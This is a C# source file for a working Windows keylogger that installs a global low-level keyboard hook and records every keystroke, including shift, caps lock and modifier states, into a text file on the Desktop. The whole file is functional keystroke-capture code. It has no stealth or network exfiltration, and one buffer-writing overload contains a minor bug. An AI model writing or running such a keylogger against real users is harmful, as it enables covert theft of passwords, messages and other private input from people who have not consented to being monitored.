using Windows.Win32;
using Windows.Win32.UI.WindowsAndMessaging;
using Windows.Win32.Foundation;

namespace klog;

#pragma warning disable CA1416
public static class Program
{
    private static readonly string PathToFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "klog.txt");
    private static readonly List<string> Buffer = new();
    private static UnhookWindowsHookExSafeHandle? _kbHook;
    private static StreamWriter _writer = new(PathToFile);
    private const uint BufferSize = 10;
    private static bool _capsLockActive;
    private static bool _shiftActive;
    private const int KEYDOWN = 0x0100;
    private const int KEYUP = 0x0101;
    private const int SYSKEYDOWN = 0x0104;

    public static unsafe void Main()
    {
        _capsLockActive = PInvoke.GetAsyncKeyState(0x14) != 0;

        // install a keyboard hook
        _kbHook = PInvoke.SetWindowsHookEx(
            WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardCallback, null, 0);
        
        // set up message queue
        MSG msg = new();
        while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
        {
            PInvoke.TranslateMessage(msg);
            PInvoke.DispatchMessage(msg);
        }
        
        // clean disposable things up
        _kbHook.Close();
        _writer.Flush();
        _writer.Dispose();
    }

    private static unsafe LRESULT KeyboardCallback(int code, WPARAM wParam, LPARAM lParam)
    {
        var kbStruct = (KBDLLHOOKSTRUCT*) lParam.Value.ToPointer();
        
        // checking for events other than keydown
        // and https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelmouseproc#ncode-in
        if (code != 0 || (wParam != KEYDOWN && wParam != KEYUP && wParam != SYSKEYDOWN))
            return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);

        var stringToWrite = "";
        
        // check for keydown
        if (wParam == KEYDOWN || wParam == SYSKEYDOWN)
        {
            stringToWrite = HandleKeyDown(kbStruct);
        }
                
        // handle keyup events as it is important with shift, alt and control
        if (wParam == KEYUP)
        {
            stringToWrite = HandleKeyUp(kbStruct);
        }
        
        WriteToFile(stringToWrite);
        
        return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
    }

    private static unsafe string HandleKeyDown(KBDLLHOOKSTRUCT* kbStruct)
    {
        // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        // maps most of the virtual key codes to human-readable strings. some that are missing are clearly marked with
        // their code
        // TODO get locale with GetKeyboardLayout and alter what for example numbers return when shift is active
        var stringToWrite = kbStruct->vkCode switch
        {
            0x08 => "\n[BACKSPACE] ",
            0x09 => "\n[TAB] ",
            0x0C => "\n[CLEAR] ",
            0x0D => "\n[ENTER] ",
            0x10 => "\n[SHIFT] ",
            0x11 => "\n[CTRL] ",
            0x12 => "\n[ALT] ",
            0x13 => "\n[PAUSE] ",
            0x14 when _capsLockActive => "[CAPS LOCK OFF] ",
            0x14 when !_capsLockActive => "\n[CAPS LOCK ON] ",
            0x15 => "\n[IME Kana/Hangul mode] ",
            0x17 => "\n[IME On] ",
            0x18 => "\n[IME final mode] ",
            0x19 => "\n[IME Hanja/Kanji mode] ",
            0x1A => "\n[IME Off] ",
            0x1B => "\n[ESCAPE] ",
            0x1C => "\n[IME convert] ",
            0x1D => "\n[IME nonconvert] ",
            0x1E => "\n[IME accept] ",
            0x1F => "\n[IME mode change request] ",
            0x20 => "\n[SPACE] ",
            0x21 => "\n[PAGE UP] ",
            0x22 => "\n[PAGE DOWN] ",
            0x23 => "\n[END] ",
            0x24 => "\n[HOME] ",
            0x25 => "\n[LEFT ARROW] ",
            0x26 => "\n[UP ARROW] ",
            0x27 => "\n[RIGHT ARROW] ",
            0x28 => "\n[DOWN ARROW] ",
            0x29 => "\n[SELECT] ",
            0x2A => "\n[PRINT] ",
            0x2B => "\n[EXECUTE] ",
            0x2C => "\n[PRINT SCREEN] ",
            0x2D => "\n[INSERT] ",
            0x2E => "\n[DELETE] ",
            0x2F => "\n[HELP] ",
            0x30 => "0",
            0x31 => "1",
            0x32 => "2",
            0x33 => "3",
            0x34 => "4",
            0x35 => "5",
            0x36 => "6",
            0x37 => "7",
            0x38 => "8",
            0x39 => "9",
            0x41 when !_capsLockActive && !_shiftActive => "a",
            0x41 when _capsLockActive || _shiftActive => "A",
            0x42 when !_capsLockActive && !_shiftActive => "b",
            0x42 when _capsLockActive || _shiftActive => "B",
            0x43 when !_capsLockActive && !_shiftActive => "c",
            0x43 when _capsLockActive || _shiftActive => "C",
            0x44 when !_capsLockActive && !_shiftActive => "d",
            0x44 when _capsLockActive || _shiftActive => "D",
            0x45 when !_capsLockActive && !_shiftActive => "e",
            0x45 when _capsLockActive || _shiftActive => "E",
            0x46 when !_capsLockActive && !_shiftActive => "f",
            0x46 when _capsLockActive || _shiftActive => "F",
            0x47 when !_capsLockActive && !_shiftActive => "g",
            0x47 when _capsLockActive || _shiftActive => "G",
            0x48 when !_capsLockActive && !_shiftActive => "h",
            0x48 when _capsLockActive || _shiftActive => "H",
            0x49 when !_capsLockActive && !_shiftActive => "i",
            0x49 when _capsLockActive || _shiftActive => "I",
            0x4A when !_capsLockActive && !_shiftActive => "j",
            0x4A when _capsLockActive || _shiftActive => "J",
            0x4B when !_capsLockActive && !_shiftActive => "k",
            0x4B when _capsLockActive || _shiftActive => "K",
            0x4C when !_capsLockActive && !_shiftActive => "l",
            0x4C when _capsLockActive || _shiftActive => "L",
            0x4D when !_capsLockActive && !_shiftActive => "m",
            0x4D when _capsLockActive || _shiftActive => "M",
            0x4E when !_capsLockActive && !_shiftActive => "n",
            0x4E when _capsLockActive || _shiftActive => "N",
            0x4F when !_capsLockActive && !_shiftActive => "o",
            0x4F when _capsLockActive || _shiftActive => "O",
            0x50 when !_capsLockActive && !_shiftActive => "p",
            0x50 when _capsLockActive || _shiftActive => "P",
            0x51 when !_capsLockActive && !_shiftActive => "q",
            0x51 when _capsLockActive || _shiftActive => "Q",
            0x52 when !_capsLockActive && !_shiftActive => "r",
            0x52 when _capsLockActive || _shiftActive => "R",
            0x53 when !_capsLockActive && !_shiftActive => "s",
            0x53 when _capsLockActive || _shiftActive => "S",
            0x54 when !_capsLockActive && !_shiftActive => "t",
            0x54 when _capsLockActive || _shiftActive => "T",
            0x55 when !_capsLockActive && !_shiftActive => "u",
            0x55 when _capsLockActive || _shiftActive => "U",
            0x56 when !_capsLockActive && !_shiftActive => "v",
            0x56 when _capsLockActive || _shiftActive => "V",
            0x57 when !_capsLockActive && !_shiftActive => "w",
            0x57 when _capsLockActive || _shiftActive => "W",
            0x58 when !_capsLockActive && !_shiftActive => "x",
            0x58 when _capsLockActive || _shiftActive => "X",
            0x59 when !_capsLockActive && !_shiftActive => "y",
            0x59 when _capsLockActive || _shiftActive => "Y",
            0x5A when !_capsLockActive && !_shiftActive => "z",
            0x5A when _capsLockActive || _shiftActive => "Z",
            0x5B => "\n[LEFT WINDOWS KEY] ",
            0x5C => "\n[RIGHT WINDOWS KEY] ",
            0x5D => "\n[APPLICATIONS KEY] ",
            0x5F => "\n[SLEEP] ",
            0x60 => "[NUMPAD 0]",
            0x61 => "[NUMPAD 1]",
            0x62 => "[NUMPAD 2]",
            0x63 => "[NUMPAD 3]",
            0x64 => "[NUMPAD 4]",
            0x65 => "[NUMPAD 5]",
            0x66 => "[NUMPAD 6]",
            0x67 => "[NUMPAD 7]",
            0x68 => "[NUMPAD 8]",
            0x69 => "[NUMPAD 9]",
            0x6A => "\n[MULTIPLY] ",
            0x6B => "\n[ADD] ",
            0x6C => "\n[SEPARATOR] ",
            0x6D => "\n[SUBTRACT] ",
            0x6E => "\n[DECIMAL] ",
            0x6F => "\n[DIVIDE] ",
            0x70 => "\n[F1] ",
            0x71 => "\n[F2] ",
            0x72 => "\n[F3] ",
            0x73 => "\n[F4] ",
            0x74 => "\n[F5] ",
            0x75 => "\n[F6] ",
            0x76 => "\n[F7] ",
            0x77 => "\n[F8] ",
            0x78 => "\n[F9] ",
            0x79 => "\n[F10] ",
            0x7A => "\n[F11] ",
            0x7B => "\n[F12] ",
            0x7C => "\n[F13] ",
            0x7D => "\n[F14] ",
            0x7E => "\n[F15] ",
            0x7F => "\n[F16] ",
            0x80 => "\n[F17] ",
            0x81 => "\n[F18] ",
            0x82 => "\n[F19] ",
            0x83 => "\n[F20] ",
            0x84 => "\n[F21] ",
            0x85 => "\n[F22] ",
            0x86 => "\n[F23] ",
            0x87 => "\n[F24] ",
            0x90 => "\n[NUM LOCK] ",
            0x91 => "\n[SCROLL LOCK] ",
            0xA0 => "\n[LEFT SHIFT] ",
            0xA1 => "\n[RIGHT SHIFT] ",
            0xA2 => "\n[LEFT CONTROL] ",
            0xA3 => "\n[RIGHT CONTROL] ",
            0xA4 => "\n[LEFT ALT] ",
            0xA5 => "\n[RIGHT ALT] ",
            0xA6 => "\n[BROWSER BACK] ",
            0xA7 => "\n[BROWSER FORWARD] ",
            0xA8 => "\n[BROWSER REFRESH] ",
            0xA9 => "\n[BROWSER STOP] ",
            0xAA => "\n[BROWSER SEARCH] ",
            0xAB => "\n[BROWSER FAVOURITES] ",
            0xAC => "\n[BROWSER START/HOME] ",
            0xAD => "\n[VOLUME MUTE] ",
            0xAE => "\n[VOLUME DOWN] ",
            0xAF => "\n[VOLUME UP] ",
            0xB0 => "\n[NEXT TRACK] ",
            0xB1 => "\n[PREVIOUS TRACK] ",
            0xB2 => "\n[STOP MEDIA] ",
            0xB3 => "\n[PLAY/PAUSE MEDIA] ",
            0xB4 => "\n[START MAIL] ",
            0xB5 => "\n[SELECT MEDIA] ",
            0xB6 => "\n[START APPLICATION 1] ",
            0xB7 => "\n[START APPLICATION 2] ",
            _ => $"[CODE {kbStruct->vkCode.ToString()}]"
        };
        
        // if caps lock or shift were pressed, negate caps lock active variable 
        if (kbStruct->vkCode == 0x14)
        {
            _capsLockActive = !_capsLockActive;
        }
        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1)
        {
            _shiftActive = !_shiftActive;
        }

        return stringToWrite;
    }

    private static unsafe string HandleKeyUp(KBDLLHOOKSTRUCT* kbStruct)
    {
        var stringToWrite = kbStruct->vkCode switch
        {
            0xA0 => " [LEFT SHIFT UP] ",
            0xA1 => " [RIGHT SHIFT UP] ",
            0xA2 => " [LEFT CONTROL UP] ",
            0xA3 => " [RIGHT CONTROL UP] ",
            0xA4 => " [LEFT ALT UP] ",
            0xA5 => " [RIGHT ALT UP] ",
            _ => ""
        };
            
        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1)
        {
            _shiftActive = !_shiftActive;
        }

        return stringToWrite;
    }

    /// <summary>
    /// Adds a string to the <see cref="Buffer"/> and writes the <see cref="Buffer"/> to file if
    /// <see cref="BufferSize"/> has been reached.
    /// </summary>
    /// <param name="stringToWrite">String to add to buffer</param>
    private static async void WriteToFile(string stringToWrite)
    {
        if (Buffer.Count >= BufferSize)
        {
            try
            {
                await WriteBuffer();
                await _writer.FlushAsync();
            }
            catch (ObjectDisposedException)
            {
                _writer = new StreamWriter(PathToFile);
                await WriteBuffer();
                await _writer.FlushAsync();
            }
            catch (InvalidOperationException)
            {
                // InvalidOperationException can be thrown when the StreamWriter is currently in use, so 
                // the code waits for 1 second before writing the buffer and copies the buffer before that so there's
                // no new buffer that would be written twice to the file while the old one would be lost
                var tempBuffer = Buffer;
                await Task.Delay(1000).ContinueWith(_ => WriteBuffer(tempBuffer));
            }
        }
        Buffer.Add(stringToWrite);
    }

    /// <summary>
    /// Writes buffer to file using the <see cref="_writer">_writer object</see>
    /// </summary>
    private static async Task WriteBuffer()
    {
        foreach (var str in Buffer)
        {
            await _writer.WriteAsync(str);
        }
        Buffer.Clear();
    }

    private static async Task WriteBuffer(ICollection<string> buffer)
    {
        foreach (var str in Buffer)
        {
            await _writer.WriteAsync(str);
        }

        buffer.Clear();
    }
}